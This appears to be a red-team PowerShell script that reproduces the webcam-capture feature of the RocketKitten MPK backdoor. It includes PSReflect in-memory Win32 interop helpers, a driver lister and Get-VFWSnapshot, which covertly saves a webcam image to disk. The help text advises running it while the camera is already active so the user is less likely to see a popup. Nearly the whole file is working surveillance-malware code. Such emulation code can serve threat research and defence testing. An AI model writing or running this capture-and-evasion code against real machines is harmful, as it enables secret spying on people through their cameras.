##########################################################################
# Get-VFWSnapshot & Get-VFWCaptureDriver
# Author: @sixdub
# POC code to mimick RocketKitten MPK backdoor's webcam capabilities
# License: BSD 3-Clause
##########################################################################



# PSReflect code for Windows API access  Author: @mattifestation
# https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1

function New-InMemoryModule
{
<#
.SYNOPSIS
Creates an in-memory assembly and module
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.DESCRIPTION
When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.
.PARAMETER ModuleName
Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.
.EXAMPLE
$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory=$True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory=$True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS
Creates a .NET type for an unmanaged Win32 function.
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func
.DESCRIPTION
Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).
The 'func' helper function can be used to reduce typing when defining
multiple function definitions.
.PARAMETER DllName
The name of the DLL.
.PARAMETER FunctionName
The name of the target function.
.PARAMETER EntryPoint
The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.
.PARAMETER ReturnType
The return type of the function.
.PARAMETER ParameterTypes
The function parameters.
.PARAMETER NativeCallingConvention
Specifies the native calling convention of the function. Defaults to
stdcall.
.PARAMETER Charset
If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.
.PARAMETER SetLastError
Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.
.PARAMETER Module
The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.
.PARAMETER Namespace
An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.
.EXAMPLE
$Mod = New-InMemoryModule -ModuleName Win32
$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)
$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
.NOTES
Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}



function Get-VFWCaptureDriver
{
<#
.SYNOPSIS
List video capture drivers on the system
Author: Justin Warner (@sixdub)
License: BSD 3-Clause
Required Dependencies: PSReflect
Optional Dependencies: None

All credit for PSReflect goes to @mattifestion. See his headers above for more info. 

.DESCRIPTION
Get-VFWCaptureDriver utilizes Video for Windows (VFW) libraries (avicap32.dll) to list video drives available. 
.OUTPUTS
Outputs a custom PSObject with the Index, Name, and Version of the drivers

.EXAMPLE
Get-VFWCaptureDriver
Description
-----------
List all capture drivers on this system.
#>
    [CmdletBinding()]
    Param()

    #Initialize required variables
    $BufferSize = 80
    $CaptureDriverName = New-Object Text.StringBuilder($BufferSize)
    $CaptureDriverVersion = New-Object Text.StringBuilder($BufferSize)
    $DriverIndex=0

    #There are 9 possible drivers this API can return. Iterate over them and print the driver in each slot
    #$CaptureDriverName and $CaptureDriverVersion are [OUT] strings that will be populated
    0..9 | %{
        $DIndex = $_
        $Result = $avicap32::capGetDriverDescription($DIndex,$CaptureDriverName,$BufferSize,$CaptureDriverVersion,$BufferSize)
        if($Result)
        {
            Write-Verbose "Slot ${DIndex}: Driver Found"
            #Create custom object and output it
            New-Object PSObject -Property @{
                Index = $DIndex
                Name = $CaptureDriverName.ToString()
                Version = $CaptureDriverVersion.ToString()
            }
        }
        else
        {
            Write-Verbose "Slot ${DIndex}: No Driver"
        }
    }
}

function Get-VFWSnapshot
{
<#
.SYNOPSIS
Utilize Video for Windows (VFW) libraries (avicap32.dll) to attempt to take a snapshot using the webcam. This is 
logically based on the RocketKitten MPK backdoor.

Sha1hash of MPK: Eb6a21585899e702fc23b290d449af846123845f
Report:
https://blog.checkpoint.com/wp-content/uploads/2015/11/rocket-kitten-report.pdf

THIS MIGHT CAUSE A POPUP TO THE USER TO SELECT VIDEO SOURCE DEPENDING ON THE SYSTEM CONFIGURATION. 
To mimize chances of a popup occuring, utilize this function when a camera is likely already active such as when
the user is using skype, hangouts, or other video features

Author: Justin Warner (@sixdub)
License: BSD 3-Clause
Required Dependencies: PSReflect
Optional Dependencies: None

All credit for PSReflect goes to @mattifestion. See his headers above for more info. 

.DESCRIPTION
Get-VFWSnapshot outputs a bitmap image from the webcam on the system 
.OUTPUTS
Outputs a fileinfo object pointing to the file that was put on disk

.PARAMETER Path
The path to write the bitmap to on disk

.PARAMETER DriverIndex
The index to the VFW driver to utilize for the video capture. Can be obtained with Get-VFWCaptureDriver. Default=First driver returned from Get-VFWCaptureDriver

.EXAMPLE
Get-VFWSnapshot -Path c:\windows\temp\secret.bmp -DriverIndex 0
Description
-----------
Utilize driver 0 to dump a snapshot to the Windows temp directory.
#>
    [CmdletBinding()]
    Param(
    [Parameter( Position = 0, Mandatory = $True)]
    [ValidateScript({$(Split-Path $_ | Test-Path) -and -Not $(Test-Path $_)})]
    [String] $Path,
    [Parameter( Position = 1, Mandatory = $False)]
    [ValidateScript({($_ -ge 0) -and ($_ -le 9)})]
    [int] $DriverIndex = $(Get-VFWCaptureDriver | Select -First 1).Index
    )
    
    #Convert output path to a pointer for the sendmessage call later
    $OutPathPtr = [Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($Path)

    #Get handle to the desktop as the parent
    $DesktopHnd = $user32::GetDesktopWindow()

    #Create capture window and store handle for latter messages. "CapWebCam" is the same indidcator used by RocketKitten
    $CaptureHnd = $avicap32::capCreateCaptureWindow("CapWebCam",1073741824,0,0,0,0,$DesktopHnd,0)

    #Let window create. Utilize capture window and send the WM_CAP_DRIVER_CONNECT message
    #THIS LINE WILL OFTEN PROMPT THE USER TO SELECT SOURCE DEVICE. KNOWN "ISSUE" IN avicap32.dll
    $InitMsgResult = $user32::SendMessage($CaptureHnd,1034,[IntPtr]$DriverIndex,[IntPtr]::Zero)
    $LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
    while($InitMsgResult.ToInt32() -eq 0)
    {
        $InitMsgResult = $user32::SendMessage($CaptureHnd,1034,[IntPtr]$DriverIndex,[IntPtr]::Zero)
    }
    
    #Send the WM_CAP_DRIVER_GET_CAPS Message
    $user32::SendMessage($CaptureHnd,1038,[IntPtr]44,[IntPtr]::Zero)
    #Send the WM_CAP_SET_SCALE Message
    $user32::SendMessage($CaptureHnd,1077,[IntPtr]1,[IntPtr]::Zero)
    #Send the WM_CAP_GRAB_FRame_NOSTOP Message
    $user32::SendMessage($CaptureHnd,1085,[IntPtr]0,[IntPtr]::Zero)
    #Send the WM_CAP_FILE_SAVEDIB Message
    $user32::SendMessage($CaptureHnd,1049,[IntPtr]0,$OutPathPtr)
    #Send the WM_CAP_DRIVER_DISCONNECT Message
    $user32::SendMessage($CaptureHnd,1035,[IntPtr]0,[IntPtr]::Zero)

}

#PSReflect Initialization. For more info, see the headers above and blogs by @mattifestation
$Mod = New-InMemoryModule -ModuleName Win32

#All win32 functions we will need in this code
$FunctionDefinitions = @(
    (func avicap32 capCreateCaptureWindow ([IntPtr]) @([String],[int],[int],[int],[int],[int],[IntPtr],[int]) -SetLastError),
    (func avicap32 capGetDriverDescription ([Bool]) @([Int16],[Text.StringBuilder],[int],[Text.StringBuilder],[int]) -SetLastError)
    (func user32 SendMessage ([IntPtr]) @([IntPtr],[int],[IntPtr],[IntPtr]) -SetLastError),
    (func user32 GetDesktopWindow ([IntPtr]) @() -SetLastError)

)
#Initialize my types and functions
$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$avicap32 = $Types['avicap32']
$user32 = $Types['user32']
